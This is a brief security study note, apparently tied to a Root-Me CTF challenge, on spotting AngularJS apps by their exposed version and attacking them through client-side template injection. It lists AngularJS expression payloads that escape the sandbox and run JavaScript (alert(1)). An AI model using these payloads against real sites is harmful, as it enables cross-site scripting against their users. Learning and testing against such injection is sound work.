# AngularJS

[![xss_dom_based_angularjs](../../../../../cybersecurity/_badges/rootme/web_client/xss_dom_based_angularjs.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)

<div class="row row-cols-lg-2"><div>

Angular is a framework to build client applications in HTML and Typescript. You can recognize an angular application with the `ng-app`:

```html!
<body ng-app="" ng-version="1.8.2">
```

Notice that the version is also exposed. Multiple vulnerabilities can be found in older versions. A common vulnerability is [XSS](/cybersecurity/red-team/s3.exploitation/vulns/web/xss.md).

```html!
{{ 21+21 }}
{{ $new.constructor("alert(1)")() }}
{{ constructor.constructor("alert(1)")() }}
```
</div><div>
</div></div>